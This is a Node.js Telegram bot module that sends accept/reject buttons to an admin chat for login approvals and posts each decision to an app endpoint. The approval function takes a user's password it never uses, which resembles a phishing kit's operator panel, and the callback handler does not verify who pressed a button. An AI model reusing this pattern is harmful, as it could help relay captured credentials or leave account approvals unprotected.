const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function sendApprovalRequest(email, password) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` },
        ],
      ],
    },
  };
  bot.sendMessage(ADMIN_CHAT_ID, ".", options);
}


bot.on("callback_query", async (query) => {
  const [action, email] = query.data.split("|");
  const status = action === "accept" ? "accepted" : "rejected";

  try {
    await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, status }),
    });

    await bot.answerCallbackQuery(query.id, {
      text: `You ${status} ${email}`,
    });

    await bot.editMessageText(`🔐 ${email} has been ${status.toUpperCase()}`, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
    });
  } catch (err) {
    console.error("❌ Failed to update status:", err);
    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error updating status for ${email}`);
  }
});

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for login approvals.");
});

module.exports = { sendApprovalRequest };
